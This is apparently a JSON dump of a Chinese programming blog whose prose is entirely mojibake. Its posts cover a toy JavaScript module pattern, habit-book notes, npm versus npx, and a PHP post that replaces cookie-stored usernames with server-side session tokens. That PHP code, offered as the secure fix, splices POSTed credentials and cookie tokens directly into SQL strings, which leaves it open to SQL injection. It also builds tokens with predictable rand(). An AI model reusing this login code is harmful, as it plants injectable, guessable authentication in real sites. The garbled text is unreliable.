æˆ‘çš„ä¾‹å­è¦å¯¦ä½œä¸€å€‹é™½æ˜¥ç‰ˆçš„æ¨¡çµ„æ©Ÿåˆ¶ï¼Œåªéœ€è¦ä¸‹é¢çš„ç¨‹å¼ç¢¼å°±å¯ä»¥é”æˆï¼š 12345678910111213141516171819202122232425function utilis(module) { function calculate(n) { return ((n * 100 + 20 - 4)) % 10 + 3 } module.exports = { cal: calculate, name: 'hello' }}function main(require) { // './utils' åªæ˜¯ç¤ºæ„ç”¨ï¼Œèˆ‡å¯¦ä½œå…§å®¹ç„¡é—œ var obj = require('./utils') console.log(obj.cal(30)) // 9 console.log(obj.name) // hello}var m = {}utilis(m) // è¼¸å‡ºæ¨¡çµ„var r = function() { return m.exports}main(r) // å¼•å…¥æ¨¡çµ„ ä½†æ˜¯æˆ‘ä¸€é–‹å§‹å»æ²’æœ‰è¾¦æ³•ä¸€çœ¼å°±çœ‹å‡ºä¾†é€™æ®µç¨‹å¼ç¢¼å¯¦éš›ä¸Šåšäº†ä»€éº¼ï¼Œä¹Ÿä¸ç†è§£ç‚ºä»€éº¼é€™æ¨£å°±å¯ä»¥å¯¦ç¾æ¨¡çµ„æ©Ÿåˆ¶ã€‚ ç›´åˆ°æˆ‘çœŸæ­£é–‹å§‹å¯«æ–‡ç« å¾Œï¼Œè©¦è‘—è‡ªå·±ä¸€è¡Œä¸€è¡ŒæŠŠç¨‹å¼ç¢¼æ‰“å‡ºä¾†ï¼Œæˆ‘æ‰çœŸæ­£ç†è§£é€™æ®µç¨‹å¼ç¢¼çš„æ„æ€ï¼›ä½†æ›´é‡è¦çš„æ˜¯ï¼Œæˆ‘æŸ¥è¦ºåˆ°ã€Œç‚ºä»€éº¼ä¸€é–‹å§‹æ²’è¾¦æ³•ç†è§£é€™æ®µç¨‹å¼ç¢¼ã€çš„åŸå› ã€‚ äººè…¦å…§å»ºçš„å¿«é€Ÿè¨ˆç®—åŠŸèƒ½ç‚ºä»€éº¼ç‰¹åˆ¥å¼·èª¿ã€Œä¸€è¡Œä¸€è¡ŒæŠŠç¨‹å¼ç¢¼æ‰“å‡ºä¾†ã€é€™å€‹å‹•ä½œï¼Ÿ å› ç‚ºé€™æ˜¯ä¸€å€‹é—œéµé»ï¼Œä¸€å€‹è®“æˆ‘ç™¼ç¾è‡ªå·±åŸä¾†ä¸æ‡‚çš„åœ°æ–¹æ˜¯ ç‰©ä»¶è¢«å‚³å…¥ function ä¿®æ”¹æ™‚çš„è¡Œç‚ºã€‚ã€‚ æ›å¥è©±èªªï¼Œå…¶å¯¦åªæ˜¯ä¸€å€‹å°åœ°æ–¹è®“æˆ‘æ²’è¾¦æ³•é‡æ¸…æ•´å€‹ç¨‹å¼ç¢¼çš„é‚è¼¯ï¼Œä½†å»å› ç‚ºç•¶æ™‚åœ°æˆ‘ä¸çŸ¥é“å•é¡Œæ˜¯å‡ºåœ¨é€™è£¡ï¼Œæ‰€ä»¥æ‰ä¸€ç›´åˆ°æˆ‘é–‹å§‹å¯¦ä½œå¾Œæ‰çœŸæ­£ç†è§£å•é¡Œçš„ç™¼ç”Ÿé»ã€‚ ä½ å¯èƒ½é‚„æ˜¯å¾ˆç–‘æƒ‘æˆ‘åˆ°åº•æƒ³è¡¨é”ä»€éº¼ï¼Ÿ æˆ‘æƒ³è¡¨é”çš„æ˜¯ï¼Œå¯«å­—æˆ–æ•²éµç›¤èƒ½å¤ è®“æˆ‘å€‘æ›´å®¹æ˜“å»ç†è§£ä¸€å€‹æ¦‚å¿µï¼Œå› ç‚ºåœ¨å¯«æ¯ä¸€å€‹å­—çš„æ™‚å€™ï¼Œæˆ‘å€‘èƒ½å¤ æ›´èšç„¦æ¯ä¸€å€‹å­—æƒ³å‚³é”çš„æ„æ€ã€‚ èˆ‰ä¾‹ä¾†èªªï¼Œè«‹ä½ å¾ä¸‹é¢çš„æ•¸å­—è£¡æ‰¾å‡ºã€Œæœ€å°çš„é‚£ä¸€å€‹ã€ï¼š 5ã€3ã€0ã€7ã€4ã€9 æˆ‘ç›¸ä¿¡ä½ ã€Œä¸€çœ¼ã€å°±èƒ½çœ‹å‡ºæ˜¯ 0ã€‚ ä½†æ˜¯ç¾åœ¨å¦‚æœå•ä½ ï¼Œå…¶ä»–çš„æ•¸å­—æ˜¯ä»€éº¼ï¼Œä½ èƒ½å›ç­”å‡ºä¾†å—ï¼Ÿ ä½ å¯èƒ½ä¹Ÿæ„è­˜åˆ°äº†ï¼Œé™¤éä½ åˆ»æ„çš„æ”¾æ…¢é€Ÿåº¦ï¼Œè®“è‡ªå·±ã€Œä¸€å€‹å­—ä¸€å€‹å­—ã€çš„å»çœ‹ï¼Œå¦å‰‡ä½ å¾ˆå¯èƒ½æœƒå¿½ç•¥æ‰å…¶ä»–çš„æ•¸å­—ã€‚ ç¾åœ¨è®“ä½ å†åšä¸€æ¬¡ã€‚ä¸éé€™ä¸€æ¬¡è¦æ”¹ç”¨å¯«çš„ï¼Œæˆ–è€…æ˜¯ç”¨æ‰“çš„ä¾†åˆ†ææ¯å€‹æ•¸å­—çš„å¤§å°ï¼š 2ã€3ã€6ã€7ã€4ã€1 ç¾åœ¨çš„ä½ æ‡‰è©²å°±èƒ½éš±ç´„è¨˜å¾—æ¯ä¸€å€‹æ•¸å­—æ˜¯å¤šå°‘äº†ã€‚ å…¶å¯¦åªæ˜¯å¾é€™å€‹éç¨‹ä¸­é«”æœƒåˆ°ï¼Œåœ¨æˆ‘å€‘çš„ç”Ÿæ´»ä¸­ï¼Œæœ‰å¤šå°‘äº‹æƒ…æ˜¯åƒé€™æ¨£å­è¢«æˆ‘å€‘äººè…¦å…§å»ºçš„ã€Œå¿«é€Ÿè¨ˆç®—ã€çµ¦å¿½ç•¥æ‰ï¼Œè€Œæˆ‘å€‘è‡ªå·±éƒ½æ²’æœ‰æŸ¥è¦ºåˆ°ã€‚ æˆ‘æƒ³æŠŠé€™ä»¶äº‹æƒ…çµ¦è¨˜éŒ„ä¸‹ä¾†ï¼Œä¹Ÿæƒ³æé†’è‡ªå·±ï¼Œé‡åˆ°çœŸçš„ä¸å¤ªæ‡‚çš„äº‹æƒ…æ™‚ï¼Œå…¶å¯¦å¯ä»¥è‡ªå·±è©¦è‘—æŠŠé›œè¨Šçµ¦å‰”é™¤ï¼ŒæŠŠä½ å·²ç¶“çŸ¥é“çš„éƒ¨åˆ†çµ¦å‰”é™¤ï¼Œå°ˆæ³¨åœ¨ä½ çœŸæ­£æƒ³ç†è§£çš„åœ°æ–¹ã€‚ å°æˆ‘è€Œè¨€ï¼Œæ‰“å­—æˆ–æ˜¯å¯«ä¸‹ä¾†å°±æ˜¯ä¸€ç¨®æœ€å°ˆæ³¨ä¹Ÿæœ€ä¸æœƒè¢«é›œè¨Šçµ¦å¹²æ“¾çš„æ–¹å¼ã€‚","link":"/2021/12/24/the-noise-in-our-life/"},{"title":"The-power-of-habit è®€å¾Œç´€éŒ„","text":"ç´€å¿µä¸€ä¸‹ä»Šå¤©æŠŠé€™æœ¬æ›¸çœ‹å®Œäº†ã€‚ åšå€‹ç´€å¿µ å¦å¤–ä¹Ÿåšå€‹ç°¡çŸ­çš„ç­†è¨˜ï¼Œè®“è‡ªå·±ä»¥å¾Œæƒ³æ”¹è®Šç¿’æ…£æ™‚å¯ä»¥åƒè€ƒã€‚ æ‰¾å‡ºæ…£è¡Œè¡Œç‚ºæ—¥å¸¸ç”Ÿæ´»ä¸­å¯èƒ½æœ‰å¾ˆå¤šæ…£æ€§å‹•ä½œï¼Œä¾‹å¦‚èªªã€Œä¸‹åˆé›¢é–‹æ¡Œå­åˆ°å’–å•¡åº—è²·ä¸€ç‰‡å·§å…‹åŠ›é¤…ä¹¾ï¼Œæ¥è‘—å’Œæœ‹å‹èŠå¤©çš„æ™‚å€™æŠŠé¤…ä¹¾åƒæ‰ã€ã€‚ æ‰¾å‡ºè¢«æ»¿è¶³çš„æ…¾æœ›æ˜¯ä»€éº¼ï¼Ÿæ‰¾å‡ºæ…¾æœ›çš„æ–¹å¼æ˜¯ï¼šåšé»å¯¦é©— ä»¥ä¸Šé¢çš„ä¾‹å­å¯ä»¥é€™æ¨£åšï¼š ç¬¬ä¸€å¤©ï¼Œä¸è¦è·‘å»å’–å•¡é¤¨ï¼Œè€Œæ˜¯å»é™„è¿‘èµ°ä¸€èµ°ï¼Œä¸è¦åƒä»»ä½•æ±è¥¿å°±å›åˆ°æ¡Œå‰ ç¬¬äºŒå¤©ï¼Œèµ°åˆ°å’–å•¡é¤¨è²·ä¸€å€‹ç”œç”œåœˆæˆ–å·§å…‹åŠ›æ£’ï¼Œç„¶å¾Œå›åˆ°æ¡Œå‰åƒ ç¬¬ä¸‰å¤©ï¼Œèµ°åˆ°è¶…å¸‚è²·ä¸€é¡†è˜‹æœï¼Œç„¶å¾Œä¸€é‚Šè·Ÿæœ‹å‹èŠå¤©ï¼Œä¸€é‚Šåƒä¸‹å»ã€‚ ç¬¬å››å¤©ï¼Œä¸è¦å»å’–å•¡é¤¨ï¼Œå˜—è©¦æ”¹å–å’–å•¡ï¼Œç„¶å¾Œå›åˆ°è¾¦å…¬å®¤è·Ÿæœ‹å‹é–’èŠå¹¾åˆ†é˜ï¼Œæœ€å¾Œå›åˆ°è‡ªå·±çš„æ¡Œå‰ã€‚ é€™äº›æ˜¯ç”¨ä¾†æ¸¬è©¦ç©¶ç«Ÿæ˜¯ä»€éº¼é©…ä½¿äº†æ…£è¡Œè¡Œç‚ºã€‚ å¦‚æœæ˜¯é¤…ä¹¾ï¼Ÿé‚£æ˜¯å› ç‚ºé¤“å—ï¼Ÿå¦‚æœæ˜¯çš„è©±ï¼Œé‚£è˜‹æœæ‡‰è©²ä¹Ÿå¯ä»¥æ»¿è¶³é€™å€‹æ…¾æœ›ã€‚æˆ–è€…æƒ³æ‰“èµ·ç²¾ç¥ï¼Ÿé‚£å’–å•¡æ‡‰è©²ä¹Ÿå¯ä»¥æ»¿è¶³ã€‚ å¦å¤–ï¼Œåœ¨å˜—è©¦é€™äº›ä¸åŒçå‹µæ™‚ï¼Œå®Œæˆæ´»å‹•å›åˆ°æ¡Œå‰çš„æ™‚å€™ï¼Œå¯ä»¥æ‹¿ä¸€å¼µç´™å¯«ä¸‹ä½ ç•¶æ™‚è…¦æµ·ä¸­æƒ³åˆ°çš„ä¸‰ä»¶äº‹ã€‚é€™æ¨£åšçš„æ„ç¾©æ˜¯ å¼·è¿«è‡ªå·±æ„è­˜åˆ°è‡ªå·±åœ¨æƒ³ä»€éº¼ï¼Ÿ æ¥è‘—ï¼Œ15 åˆ†é˜å¾Œä½ å¯ä»¥å•è‡ªå·±ã€Œé‚„æƒ³åƒé¤…ä¹¾å—ï¼Ÿã€ã€‚å¦‚æœæ˜¯ï¼Œé‚£å°±ä»£è¡¨æ¸´æœ›ç³–åˆ†ä¸æ˜¯å¼•ç™¼é€™å€‹ç¿’æ…£çš„æ´æ‚‰ã€‚æˆ–æ˜¯èˆ‡åŒäº‹é–’èŠå®Œå¾Œï¼Œä½ é‚„æ˜¯æƒ³åƒé¤…ä¹¾ï¼Œé‚£å°±ä»£è¡¨èˆ‡äººäº¤æµä¸æ˜¯é©…ä½¿ä½ è¡Œç‚ºçš„æ±è¥¿ã€‚ ç¯©é¸æç¤ºå› ç‚ºç”Ÿæ´»å‘¨é­æœ‰å¤ªå¤šçš„é›œè¨Šï¼Œæ‰€ä»¥ä½ å¯ä»¥è©¦è‘—ç¯©é¸å‡ºã€Œä½ æƒ³è¦å°ˆæ³¨çš„å¹¾å€‹æç¤ºã€ï¼Œåœ¨åšå‡ºæŸå€‹æ…£è¡Œè¡Œç‚ºæ™‚çš„ï¼š åœ°é» æ™‚é–“ æƒ…ç·’ç‹€æ…‹ å…¶ä»–äºº åšç¿’æ…£å‹•ä½œä¹‹å‰çš„è¡Œç‚º å¦‚æœåœ¨åšå‡ºæŸå€‹æ…£è¡Œè¡Œç‚ºæ™‚ï¼Œå“ªä¸€å€‹é …ç›®ç¶“å¸¸å‡ºç¾ï¼Œé‚£å¾ˆæœ‰å¯èƒ½é‚£å°±æ˜¯è§¸ç™¼é€™å€‹è¡Œç‚ºçš„ã€Œæç¤ºã€ ç«‹ä¸‹è¨ˆç•«ä»¥ä¸Šé¢çš„ä¾‹å­ç‚ºä¾‹ï¼š æç¤ºï¼šæ™‚é–“åœ¨ä¸‹åˆä¸‰é»åŠå·¦å³ æ…£è¡Œè¡Œç‚ºï¼šèµ°åˆ°å’–å•¡é¤¨ã€è²·é¤…ä¹¾ã€è·Ÿæœ‹å‹èŠå¤© çå‹µï¼šé€éå¯¦é©—ç™¼ç¾çµæœæ˜¯ï¼ŒçŸ­æš«çš„ä¼‘æ¯èˆ‡ç¤¾äº¤æ©Ÿæœƒ æ‰€ä»¥è¨ˆåŠƒå°±æœƒæ˜¯ï¼šæ¯åˆ°ä¸‹åˆä¸‰é»åŠæ™‚ï¼Œæˆ‘è¦èµ°åˆ°æœ‹å‹æ¡Œé‚ŠèŠå¤©ååˆ†é˜ é€™ä»½è¨ˆç•«çµ•å°ä¸æœƒä¸€é–‹å§‹å°±åŸ·è¡Œçš„å¾ˆé †åˆ©ï¼Œä½†ç•¶ä½ é€æ¼¸æŠŠé€™å€‹ã€Œæ–°çš„ç¿’æ…£ã€é¤Šæˆæ™‚ï¼Œä½ è‡ªç„¶å°±æœƒä¸è‡ªè¦ºçš„å»åšé€™ä»¶äº‹ï¼Œè€Œä¸ç”¨å†æœ‰ã€Œåˆ»æ„å»åšã€çš„æ„Ÿè¦ºã€‚","link":"/2021/12/23/the-power-of-habit/"},{"title":"ç•¶ Cookie è¢«ç«„æ”¹æœƒæ€éº¼æ¨£ï¼Ÿ","text":"å°±ç³Ÿç³•å•¦ï½ ç°¡è¿°ä¸Šæ¬¡åœ¨ åˆ©ç”¨ Cookie å¯¦ä½œç™»å…¥æ©Ÿåˆ¶ ä¸­å·²ç¶“å¯¦ä½œå‡ºä¸€å€‹åŸºæœ¬çš„ç™»å…¥åŠŸèƒ½ï¼Œä½†æ–‡æœ«æœ‰æéé€™æ¨£æœƒæœ‰ cookie è¢«ç«„æ”¹çš„å•é¡Œã€‚é€™ç¯‡æ–‡ç« å°±ä¾†è§£é‡‹ä¸€ä¸‹æ˜¯ä»€éº¼å•é¡Œï¼Ÿä»¥åŠè©²å¦‚ä½•è§£æ±ºï¼Ÿ å‡å†’åˆ¥äººèº«åˆ†æ—¢ç„¶ cookie å€¼å¯ä»¥ä»»æˆ‘æ”¹ï¼Œé‚£åªè¦çŸ¥é“å…¶ä»–äººçš„ username æ˜¯ä»€éº¼å°±å¯ä»¥å‡å†’èº«åˆ†äº†ï¼š è£œå……ä¸€ä¸‹ã€Œæ–°å¢ç•™è¨€ã€çš„ç¨‹å¼é‚è¼¯ï¼Œä¸ç„¶æœƒçœ‹ä¸å¤ªæ‡‚ï¼š 12345678910111213141516171819202122232425262728293031323334/* handle_add_comments.php */&lt;?php require_once('./conn.php'); require_once('./utils.php'); // é€é cookie æ‹¿åˆ°ç›®å‰çš„ user $username = $_COOKIE['username']; // æ’ˆå‡º user è³‡æ–™ $user = getUser($username); // å¾ user è³‡æ–™ä¸­æ‰¾å‡ºæš±ç¨±çš„æ¬„ä½ $nickname = $user['nickname']; // ç”¨ POST å¸¶éä¾†çš„ç•™è¨€å…§å®¹ $content = $_POST['content']; // æª¢æŸ¥ç•™è¨€å…§å®¹ if (empty($content)) { header('Location: index.php?errorCode=1'); die(); } // åŠ åˆ°è³‡æ–™åº« $sql = sprintf( \"INSERT INTO comments(`nickname`, `content`) VALUES ('%s', '%s')\", $nickname, $content ); try { $result = $conn-&gt;query($sql); header('Location: index.php'); } catch (Exception $e) { echo 'åŸ·è¡Œå¤±æ•—ï¼š' . $e-&gt;getMessage() . '&lt;br&gt;'; echo 'éŒ¯èª¤ä»£ç¢¼ï¼š' . $conn-&gt;errno; }?&gt; ç°¡å–®ä¾†èªªï¼Œç•¶ request é€å‡ºå»æ™‚ï¼Œhandle_add_comments.php æœƒå¾ cookie çš„å…§å®¹æ‰¾å‡ºå°æ‡‰çš„ userï¼Œå–å¾—ä½¿ç”¨è€…è³‡è¨Šå¾Œå†æŠŠå…§å®¹å¯«åˆ°è³‡æ–™åº«è£¡ã€‚ä¹Ÿå°±æ˜¯èªª cookie å¯«èª°å°±ä»£è¡¨èª° çš„æ„æ€ï¼Œå› æ­¤æœ€å¾Œç•™è¨€çš„æ‰æœƒæ˜¯ç„¡æ…˜è€Œä¸æ˜¯ç…‰ç„ã€‚ è§£æ±ºè¾¦æ³•å‰é¢é€™ç¨®ã€ŒæŠŠè³‡è¨Šéƒ½å­˜åœ¨ç€è¦½å™¨çš„ Cookieã€çš„åšæ³•å…¶å¯¦å«åšã€ŒCookie-based sessionã€ï¼Œä½†ç¾åœ¨è¦æ›å€‹æ€ç¶­ï¼Œæˆ‘å€‘å¯ä»¥æ”¹æˆã€ŒæŠŠè³‡è¨Šå­˜åœ¨ Server ç«¯ã€ä¾†è™•ç†ï¼Œé€™ç¨®ä½œæ³•å«ã€ŒSession Identifierã€ã€‚ æ„æ€æ˜¯èªªï¼Œè¦å­˜åœ¨ cookie çš„æ±è¥¿ä¸æ˜¯è³‡è¨Šæœ¬èº«ï¼Œè€Œæ˜¯ä¸€å€‹é¡ä¼¼ã€Œé€šè¡Œè­‰ã€çš„æ±è¥¿ã€‚å°±å¥½åƒä½ å»å¥½å¸‚å¤šè³¼ç‰©è¦æª¢æŸ¥æœƒå“¡å¡ä¸€æ¨£ï¼Œã€Œæœƒå“¡å¡ã€å°±æ˜¯è¦ç”¨ä¾†æ”¾åœ¨ cookie è£¡é¢çµ¦ Server è­˜åˆ¥çš„æ±è¥¿ã€‚ è©±èªªå›ä¾†ï¼Œå‰›å‰›èªªæŠŠè¦å„²å­˜çš„è³‡è¨Šæ”¾åœ¨ Server ç«¯ï¼Œä½†å¯¦éš›ä¸Šæ˜¯æŒ‡å“ªè£¡ï¼Ÿ ç•¶ç„¶å°±æ˜¯ è³‡æ–™åº« å›‰ï¼ æˆ‘å€‘å¯ä»¥æ–°é–‹ä¸€å€‹å«åš tokens çš„è³‡æ–™åº«ï¼Œå°ˆé–€æ”¾æ¯å€‹ token å°æ‡‰åˆ°å“ªå€‹ userï¼Œåƒé€™æ¨£ï¼š ç¾åœ¨é‚„æ²’å­˜ä»»ä½•æ±è¥¿æ‰€ä»¥æ¬„ä½éƒ½æ˜¯ç©ºçš„ã€‚ ç¸½ä¹‹å‘¢ï¼Œç™»å…¥é€™ä¸€æ®µè¦åšçš„äº‹æƒ…å¾ˆç°¡å–®ï¼š ç•¶ç™»å…¥æˆåŠŸå¾Œï¼Œç”¢ç”Ÿä¸€å€‹ token æŠŠ token å¯«åˆ° cookieï¼Œä¸¦ä¸”æŠŠ token å°æ‡‰åˆ°çš„ user å¯«åˆ°è³‡æ–™åº«ä¸­ 1234567891011// å…ˆå¯«å¥½ç”¢ç”Ÿ token çš„ function&lt;?php function generateToken() { $s = ''; for ($i=0; $i&lt;15; $i++) { // A ~ Z $s .= chr(rand(65,90)); } return $s; }&gt; 1234567891011121314151617181920212223242526272829303132333435/* handle_login.php */&lt;?php require_once('./conn.php'); require_once('./utils.php'); // POST éä¾†çš„å¸³è™Ÿå¯†ç¢¼ $username = $_POST['username']; $password = $_POST['password']; // æª¢æŸ¥å¸³è™Ÿå¯†ç¢¼ $sql = \"SELECT * FROM users WHERE username='$username' AND password='$password'\"; $result = $conn-&gt;query($sql); /* å¸³è™Ÿå¯†ç¢¼æ­£ç¢ºçš„è©±ï¼š 1. ç”¢ç”Ÿ Token 2. æŠŠ Token è·Ÿå°æ‡‰çš„ username å­˜åˆ°è³‡æ–™åº« 3. æŠŠ Token å­˜åˆ° cookie ä¸­ */ if ($result-&gt;num_rows &gt; 0) { // ç”¢ç”Ÿ Token $token = generateToken(); // ä¸‹ query $sql = \"INSERT INTO tokens(`token`, username) VALUE('$token', '$username')\"; $conn-&gt;query($sql); // cookie éæœŸæ™‚é–“ $expire = time() + 3600 * 24 * 30; // è¨­å®š cookie setcookie('token', $token, $expire); // ç™»å…¥æˆåŠŸï¼Œå°å›é¦–é  header('Location: ./index.php'); } else { // ç™»å…¥å¤±æ•— header('Location: ./login.php?errorCode=2'); }?&gt; æ¥ä¸‹ä¾†çš„ index.php çš„æµç¨‹ä¹Ÿå·®ä¸å¤šï¼Œåªæ˜¯ç¨å¾®å¤šå¹¾å€‹æ­¥é©Ÿï¼š æ ¹æ“š cookie ä¸­çš„ token å» tokensï¼ˆtableï¼‰ æ‰¾åˆ°å°æ‡‰çš„ username æ‹¿ username å» usersï¼ˆtableï¼‰ æ‰¾åˆ°å°æ‡‰çš„ user 12345678910111213141516/* index.php */&lt;?php require_once(\"./conn.php\"); require_once(\"./utils.php\"); // æ²’ç™»å…¥çš„è©±å°±æ˜¯ null $username = Null; // æª¢æŸ¥ cookie ä¸­çš„ token if (!empty($_COOKIE['token'])) { $token = $_COOKIE['token']; // ç”¨ token å»æ‹¿ user è³‡æ–™ $user = getUserFromToken($token); $username = $user['username']; $nickname = $user['nickname']; }?&gt; ä¸€æ¨£é™„ä¸Š getUserFromToken($token) çš„ç¨‹å¼é‚è¼¯ï¼š 1234567891011121314151617181920212223/* utils.php */&lt;?php require_once('./conn.php'); function getUserFromToken($token) { // å­˜å–å…¨åŸŸè®Šæ•¸è¦è¨˜å¾—ç”¨ global global $conn; // å…ˆå¾ tokens ä¸­æ‰¾åˆ°å°æ‡‰çš„ username $sql = \"SELECT username FROM tokens WHERE token='$token'\"; $result = $conn-&gt;query($sql); // ä»£è¡¨æ²’æœ‰æ‰¾åˆ°å°æ‡‰çš„ userï¼Œå›å‚³ Failed if ($result-&gt;num_rows === 0) { return 'Failed'; } // æˆåŠŸæ‹¿åˆ° tokens ä¸­çš„ username $row = $result-&gt;fetch_assoc(); $username = $row['username']; // ä¸‹ç¬¬äºŒå€‹ query $sql = \"SELECT * FROM users WHERE username='$username'\"; $result = $conn-&gt;query($sql); // é€™é‚Šå°±æ˜¯ user çš„è³‡æ–™äº†ï¼Œå‚³å›å» return $result-&gt;fetch_assoc(); }?&gt; æœ€å¾Œä¸€æ¨£å°±å®Œæˆç™»å…¥æ©Ÿåˆ¶äº†ï¼Œä½†è·Ÿå‰›å‰›ä¸åŒçš„æ˜¯ç¾åœ¨æ²’è¾¦æ³•å†ç«„æ”¹ cookie ä¾†å‡å†’åˆ¥äººèº«åˆ†ï¼š ä¸€æ¨£é™„ä¸Šã€Œæ–°å¢ç•™è¨€ã€çš„ç¨‹å¼é‚è¼¯ï¼š 123456789101112131415161718192021222324252627282930313233343536&lt;?php require_once('./conn.php'); require_once('./utils.php'); /* é€™é‚Šä¸€æ¨£æ˜¯å­˜å– cookie å€¼ï¼Œ ä½†æ˜¯ç•¶ token ä¸æ­£ç¢ºæ™‚ï¼ŒgetUserFromToken($token) æœƒå›å‚³ Failedï¼Œ æ‰€ä»¥ä¸‹é¢çš„ $nickname = $user['nickname'] å°±æœƒå™´ Fatal errorï¼Œ ä½ å¯ä»¥æŠŠé€™é‚Šæ”¹æˆå°å› index.php?errorCode=2 é¡¯ç¤ºéŒ¯èª¤è¨Šæ¯ä¹‹é¡çš„ã€‚ ç¸½ä¹‹ï¼Œé€™é‚Šçš„é‡é»æ˜¯è¦èªªæ˜æ²’è¾¦æ³•å†ç«„æ”¹ cookie äº†è€Œå·²ã€‚ */ $token = $_COOKIE['token']; $user = getUserFromToken($token); $nickname = $user['nickname']; $content = $_POST['content']; // æª¢æŸ¥ç•™è¨€å…§å®¹ if (empty($content)) { header('Location: index.php?errorCode=1'); die(); } // åŠ åˆ°è³‡æ–™åº« $sql = sprintf( \"INSERT INTO comments(`nickname`, `content`) VALUES ('%s', '%s')\", $nickname, $content ); try { $result = $conn-&gt;query($sql); header('Location: index.php'); } catch (Exception $e) { echo 'åŸ·è¡Œå¤±æ•—ï¼š' . $e-&gt;getMessage() . '&lt;br&gt;'; echo 'éŒ¯èª¤ä»£ç¢¼ï¼š' . $conn-&gt;errno; }?&gt; ä»¥ä¸Šå°±æ˜¯è§£æ±º cookie è¢«ç«„æ”¹çš„æ‡‰å°æ–¹æ³•ï¼Œä»¥åŠ Session Identifier çš„æ¦‚å¿µï¼ŒæŠŠè³‡æ–™å­˜åœ¨ Serverï¼ŒCookie åªå­˜ Tokenï¼ˆæˆ–å« Session IDï¼‰ã€‚ æœ€å¾Œè£œå……ä¸€ä¸‹ï¼Œç™»å‡ºçš„æ™‚å€™ä¸è¦å¿˜äº†æŠŠè³‡æ–™åº«ä¸­çš„ token çµ¦æ¸…æ‰ï¼š 1234567891011/* handle_logout.php */&lt;?php require_once('./conn.php'); $token = $_COOKIE['token']; // å…ˆåˆªé™¤è³‡æ–™åº«ä¸­çš„å…§å®¹ $sql = \"DELETE FROM tokens WHERE token='$token'\"; $conn-&gt;query($sql); // å†æ¸…é™¤ cookie setcookie('token', '', time() - 3600); header('Location: ./index.php');?&gt; å¾Œè¨˜å…¶å¯¦ PHP è£¡é¢å°±æœ‰å…§å»ºçš„ session æ©Ÿåˆ¶ï¼Œç”¨æ³•å¯ä»¥åƒè€ƒé€™ç¯‡ï¼šPHP å…§å»ºçš„ session æ–¹æ³• é›–ç„¶å…§å»ºæ–¹æ³•ç”¨èµ·ä¾†ç°¡å–®ï¼Œè€Œä¸”ä¹Ÿæ¯”è¼ƒç©©å®šï¼Œä½†è‡ªå·±æ‰‹å·¥å¯¦ä½œä¸€éç¢ºå¯¦æœƒå°ã€ŒSession Identifierã€çš„æ¦‚å¿µæœ‰æ›´æ·±çš„ç†è§£ï¼Œæ‰€ä»¥æ‰æœƒæƒ³å¯«ç¯‡æ–‡ç« ä¾†åšç´€éŒ„ã€‚","link":"/2022/02/08/the-problem-of-cookie/"},{"title":"npm script èˆ‡ npx çš„ç”¨é€”","text":"è§£æ±ºå¤šå¹´ç–‘æƒ‘ã€‚ ç‚ºä»€éº¼ç”¨ npm run æˆ– npx å°±å¯ä»¥åŸ·è¡Œï¼Ÿï¼ˆé€™è£¡ä»¥ jest ä¾†èˆ‰ä¾‹ï¼‰ åœ¨åŸ·è¡Œ jest æŒ‡ä»¤çš„æ™‚å€™ä½ å¯èƒ½æœƒç”¨ä»¥ä¸‹å¹¾ç¨®æ–¹å¼ï¼š ç›´æ¥åœ¨ terminal ä¸ŠåŸ·è¡Œ jest æŒ‡ä»¤ é€é package.json çš„ srcipt åŸ·è¡Œ npm run xxx é€é npx jest xxx å¦‚æœæ˜¯ 2ã€3 çš„è©±éƒ½æ²’å•é¡Œï¼Œä½† 1 çš„è©±ä½ æ‡‰è©²æœƒç›´æ¥å¾—åˆ°éŒ¯èª¤ï¼š ä¸»è¦æ˜¯å› ç‚ºï¼šæŒ‡ä»¤çš„å„²å­˜ä½ç½® ä»¥é€™å€‹ä¾‹å­ä¾†èªªï¼Œjest æ˜¯å®‰è£åœ¨ã€Œå°ˆæ¡ˆåº•ä¸‹ã€ï¼Œè€Œä¸æ˜¯å®‰è£åœ¨ã€Œå…¨åŸŸã€çš„é›»è…¦ç³»çµ±è£¡ã€‚ åœ¨ terminal ä¸ŠåŸ·è¡Œ jest æŒ‡ä»¤æ™‚ï¼Œå®ƒæœƒåˆ°ç³»çµ±è£¡é¢å»æ‰¾æœ‰æ²’æœ‰ jest é€™å€‹æŒ‡ä»¤ï¼Ÿä½†å› ç‚ºå®ƒæ‰¾ä¸åˆ°ï¼Œæ‰€ä»¥æœ€å¾Œå°±æœƒå™´ errorã€‚ è€Œ npm srcipt è·Ÿ npx jest æŒ‡ä»¤å¯ä»¥æ­£å¸¸åŸ·è¡Œï¼Œæ˜¯å› ç‚ºå®ƒå€‘éƒ½æœƒè‡ªå‹•åˆ°å°ˆæ¡ˆåº•ä¸‹å»æ‰¾æœ‰æ²’æœ‰ä½ è¼¸å…¥çš„é€™å€‹æŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯ jestã€‚æœ€å¾Œæœ‰æ‰¾åˆ°ï¼Œæ‰€ä»¥é †åˆ©åŸ·è¡Œã€‚ ç°¡å–®ä¾†èªªï¼Œä¸€å€‹æ˜¯ã€Œå¾ç³»çµ±è£¡é¢æ‰¾ã€ï¼Œä¸€å€‹æ˜¯å¾ã€Œå°ˆæ¡ˆè£¡é¢æ‰¾ã€ï¼Œåªæ˜¯é€™æ¨£çš„å·®ç•°è€Œå·²ã€‚","link":"/2021/12/24/the-purpose-of-npm-script-and-npx/"},{"title":"é–‰åŒ…çš„å¯¦éš›æ‡‰ç”¨ï¼šthrottle å’Œ debounce","text":"é€™å€‹ä¾‹å­æœ‰è¶£å¾ˆå¤šã€‚ throttlethrottle çš„ç›´ç¿»æ˜¯ã€Œç¯€æµã€ã€‚ å¦‚æœä½ è·Ÿæˆ‘ä¸€æ¨£ç„¡èŠï¼Œæœ‰ç ”ç©¶éæ±½æ©Ÿè»Šçš„å¼•æ“é‹ä½œåŸç†çš„è©±ï¼Œé‚£ä½ æ‡‰è©²çŸ¥é“ã€Œç¯€æµé–¥ã€æ˜¯ä»€éº¼ï¼Œé‚„æœ‰å®ƒçš„ç”¨é€”ã€‚throttle çš„æ„æ€è·Ÿå®ƒé‚„è »é¡ä¼¼çš„ï¼ˆæˆ‘è¦ºå¾—å•¦ï¼‰ã€‚ ç•¶ç„¶ï¼Œæ²’ç ”ç©¶éçš„è©±ä¹Ÿæ²’é—œä¿‚ã€‚ ç°¡å–®ä¾†èªªï¼Œthrottle 